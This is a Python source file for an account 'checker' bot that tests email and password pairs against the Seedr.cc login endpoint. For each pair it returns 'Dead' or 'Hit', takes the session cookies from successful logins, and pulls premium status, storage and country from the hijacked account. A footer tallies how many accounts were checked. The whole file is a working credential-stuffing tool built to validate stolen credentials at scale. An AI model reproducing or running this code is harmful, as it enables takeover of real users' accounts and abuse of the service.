import requests
import time

def check_seedr_account(email, password):
    login_url = "https://www.seedr.cc/auth/login"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    data = {
        "username": email,
        "password": password
    }

    response = requests.post(login_url, headers=headers, json=data)
    
    if response.status_code == 400:
        return "Dead", "Incorrect Email OR Password❌"

    response_data = response.json()

    if response_data.get("error"):
        return "Dead", "Incorrect Email OR Password❌"
    else:
        is_premium = response_data.get("is_premium", False)
        cookies = response.cookies.get_dict()
        rss_session = cookies.get("RSESS_session")
        rss_remember = cookies.get("RSESS_remember")

        if not rss_session or not rss_remember:
            return "Dead", "Failed to retrieve session cookies"

        settings_url = "https://www.seedr.cc/account/settings"
        settings_headers = {
            'accept': 'application/json',
            'cookie': f'RSESS_session={rss_session}; RSESS_remember={rss_remember}'
        }

        settings_response = requests.get(settings_url, headers=settings_headers)
        settings_data = settings_response.json()

        account = settings_data.get("account", {})
        storage_max = account.get("space_max", 0)
        package_name = account.get("package_name", "NON-PREMIUM")
        country = settings_data.get("country", "N/A")
        storage_gb = convert_bytes_to_gb(storage_max)

        result = (f"HIT SUCCESSFULLY\n"
                  f"Premium: {is_premium}\n"
                  f"Storage: {storage_gb} GB\n"
                  f"Package: {package_name}\n"
                  f"Country: {country}")
        return "Hit", result

def convert_bytes_to_gb(bytes):
    gb = bytes / (1024 * 1024 * 1024)
    return round(gb, 2)

def get_footer_info(total_accounts, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"⌧ Total ACCOUNT Checked - {total_accounts}\n"
        f"⌧ Time Taken - {elapsed_time:.2f} seconds\n"
        f"⌧ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB [BOSS]\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
